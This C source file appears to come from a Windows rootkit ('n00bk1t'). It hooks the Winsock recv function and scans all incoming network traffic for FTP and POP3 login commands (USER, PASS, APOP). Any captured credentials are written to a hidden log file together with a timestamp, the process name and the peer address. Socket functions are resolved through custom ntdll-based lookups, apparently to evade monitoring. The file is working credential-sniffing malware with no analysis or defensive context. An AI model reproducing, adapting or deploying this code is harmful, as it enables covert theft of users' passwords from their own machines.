#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include "ntdll.h"

#include "engine.h"
#include "misc.h"
#include "recv.h"

extern CHAR n00bk1tLogFile[MAX_PATH+1];

// filter buf for user/pass from ftp/pop3/...
LPSTR GetCredentials(LPSTR lpBuffer,int iLen)
{	
	LPSTR lpCred;
	CHAR* cFilterArr[]={"USER ","PASS ","APOP ",NULL};
	int i=0;

	// check all strings
	while(cFilterArr[i])
	{
		// check length
		if (iLen>strlen(cFilterArr[i]))
		{
			// check first char
			if (_strnicmp(lpBuffer,cFilterArr[i],1)==0)
			{
				// check full string
				if (_strnicmp(lpBuffer,cFilterArr[i],strlen(cFilterArr[i]))==0)
				{
					lpCred=lpBuffer+strlen(cFilterArr[i]);
					return lpCred;
				}
			}
		}
		i++; // next
	}

	return NULL;
}

// clear out \r\n
CHAR* CommandCopy(LPSTR lpBuffer,int num)
{
	int i=0;
	CHAR* lpCopy;

	lpCopy=(LPSTR)GlobalAlloc(GPTR,num+1);
	if (!lpCopy)
		return NULL;

	ZeroMemory(lpCopy,num+1);

	while (i<num)
	{
		if (lpBuffer[i]=='\r'||lpBuffer[i]=='\n')
			break;

		lpCopy[i]=lpBuffer[i];

		i++;
	}

	return lpCopy;
}

// log captured credentials from ftp/pop3/...
void LogCapturedCredentials(LPSTR lpBuffer,int num,LPSTR lpDetail,SOCKET s)
{
	LPSTR lpLogBuffer;
	size_t stBufferLen;
	SYSTEMTIME stTime;
	CHAR lpFullProcName[MAX_PATH+1];
	CHAR *lpProcName;
	CHAR *lpWriteBuffer;
	struct sockaddr_in sin;
	int len=sizeof(sin);
	unsigned short port=0;
	GETPEERNAME pgetpeername;
	NTOHS pntohs;
	
	// get ip/port
	memset(&sin,0,sizeof(sin));
	if (pgetpeername=(GETPEERNAME)engine_NtGetProcAddress(engine_NtGetModuleHandleA("WS2_32"),"getpeername")) pgetpeername(s,(struct sockaddr*)&sin,&len);
	if (pntohs=(NTOHS)engine_NtGetProcAddress(engine_NtGetModuleHandleA("WS2_32"),"ntohs")) port=pntohs(sin.sin_port);

	// get time
	GetLocalTime(&stTime);

	if (!GetModuleFileName(NULL,lpFullProcName,MAX_PATH)) strcpy(lpFullProcName,"Unknown");
	
	lpProcName=strrchr(lpFullProcName,'\\');
	if (!lpProcName) lpProcName=lpFullProcName;
	else lpProcName++;

	lpWriteBuffer=CommandCopy(lpBuffer,num);
	if (!lpWriteBuffer)
		return;
	
	stBufferLen=strlen(lpProcName)+strlen(lpWriteBuffer)+strlen(lpDetail)+strlen("[00:00 00/00/0000] [] (255.255.255.255:65535)  \r\n");

	// alloc buffer
	lpLogBuffer=(LPSTR)GlobalAlloc(GPTR,stBufferLen+1);
	if (!lpLogBuffer)
	{
		GlobalFree(lpWriteBuffer);
		return;
	}

	// build string
	_snprintf(lpLogBuffer,stBufferLen,"[%02d:%02d %02d/%02d/%04d] [%s] (%d.%d.%d.%d:%d) %s %s\r\n",
		stTime.wHour,stTime.wMinute,stTime.wDay,stTime.wMonth,stTime.wYear,
		lpProcName,sin.sin_addr.S_un.S_addr&0xFF,(sin.sin_addr.S_un.S_addr>>8)&0xFF,
		(sin.sin_addr.S_un.S_addr>>16)&0xFF,(sin.sin_addr.S_un.S_addr>>24)&0xFF,
		port,lpDetail,lpWriteBuffer);

	// write to file
	misc_WriteDataToFile(n00bk1tLogFile,lpLogBuffer,strlen(lpLogBuffer)); 
	
	// free buffer
	GlobalFree(lpWriteBuffer);
	GlobalFree(lpLogBuffer);
}

// ws2_32.recv
int WINAPI NewRecv(int s,char FAR* buf,int len,int flags)
{
	int r;

	r=OldRecv(s,buf,len,flags);
	if (r!=SOCKET_ERROR)
	{
		if (GetCredentials(buf,len)) 
			LogCapturedCredentials(buf,len,"<<",s);
	}

	return r;
}